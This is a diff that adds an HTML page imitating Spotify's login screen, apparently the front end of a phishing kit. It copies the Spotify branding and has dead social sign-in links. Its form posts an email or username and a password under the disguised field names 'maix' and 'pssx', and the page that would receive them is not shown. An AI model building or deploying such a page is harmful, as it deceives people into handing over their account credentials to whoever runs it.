@@ -1,0 +1,82 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Spotify</title>
+    <link rel="stylesheet" href="./img/style.css">
+    <link rel="stylesheet" href="./img/all.min.css">
+    <link rel="icon" href="https://img.icons8.com/ios11/512/spotify.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+</head>
+<body>
+    <nav>
+        <p class="logo-name">Spotify</p>
+    </nav>
+    <div class="lawl-navdzb">
+        <h1 class="rass">Log in to Spotify</h1>
+<div class="dkhl-tari9a">
+    <div class="tari9a1">
+        <img class="inx" src="./img/gl.svg">
+        <a href="#" class="dkhl-text">Continue with Google</a>
+    </div>
+    <div class="tari9a2">
+        <img class="inx" src="./img/fb.svg">
+        <a href="#" class="dkhl-text">Continue with Facebook</a>
+    </div>
+    <div class="tari9a3">
+        <img class="inx" src="./img/ap.svg">
+        <a href="#" class="dkhl-text">Continue with Apple</a>
+    </div>
+    <div class="tari9a4">
+        <a href="#">Continue with phone number</a>
+    </div>
+</div>
+
+<form method="post" class="dkhl-sift">
+    <table>
+        <tr>
+            <td class="labels">Email or username</td>
+        </tr>
+        <tr>
+            <td class="flds">
+                <input type="text" name="maix" placeholder="Email or username" class="inp-gib" required>
+            </td>
+        </tr>
+        <tr>
+            <td class="labels">Password</td>
+        </tr>
+        <tr>
+            <td class="flds">
+                <input type="password" name="pssx" id="pssx" placeholder="Password" class="inp-gib" required>
+            </td>
+        </tr>
+        <tr>
+            <td class="checks">
+                <input type="checkbox" id="switch" checked><label class="label" for="switch"></label>
+                <label class="lbx" for="remember">Remember me</label>
+            </td>
+        </tr>
+    </table>
+    <button class="log-in-btn">Log in</button>
+    <a href="#" class="link">Forgot password?</a>
+</form>
+
+<div class="extra-option">
+    Don't have an account? <a href="#" class="link">Sign up for Spotify</a>
+</div>
+
+    <script src="./img/jquery.min.js"></script>
+    <script>
+        $(".psh").click(function () {
+            $(this).toggleClass("fa-eye fa-eye-slash");
+            var input = $($(this).attr("toggle"));
+            if (input.attr("type") == "password") {
+                input.attr("type", "text");
+            } else {
+                input.attr("type", "password");
+            }
+        });
+    </script>
+</body>
+</html>
